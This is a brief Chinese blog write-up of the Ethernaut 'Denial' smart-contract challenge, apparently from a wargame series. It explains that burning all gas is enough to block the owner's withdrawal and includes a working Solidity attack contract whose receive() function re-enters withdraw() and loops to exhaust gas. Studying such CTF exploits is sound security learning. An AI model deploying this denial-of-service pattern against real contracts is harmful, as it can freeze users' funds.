---
title: Ethernaut - Denial
categories: [Ethernaut]
tags: [以太坊, 智能合约, Ethernaut]
date: 2024-12-24
---

这是一个简单的钱包，随着时间的推移会慢慢滴出资金。你可以通过成为提取合作伙伴来慢慢提取资金。如果你能在所有者调用 withdraw（） 时拒绝他们提取资金（当合约仍有资金，且交易费用为1M gas或更少）时，你将赢得这一级别。

<!--more-->

不能用重入攻击提取完所有资金，因为要求合约有资金但是不能被提取，而且有 gas 限制。

想多了，就是消耗完gas就行。

```solidity
interface IDenial {
    function withdraw() external;
    function setWithdrawPartner(address _partner) external;
}

contract Denial {
    address levelInstance;

    constructor(address _levelInstance) {
        levelInstance = _levelInstance;
    }

    receive()  external payable {
        IDenial(levelInstance).withdraw();
        int sum = 0;
        for (int i = 0; i < 100000; i++) {
            sum += i;
        }
    }

    function withdraw() public payable {
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

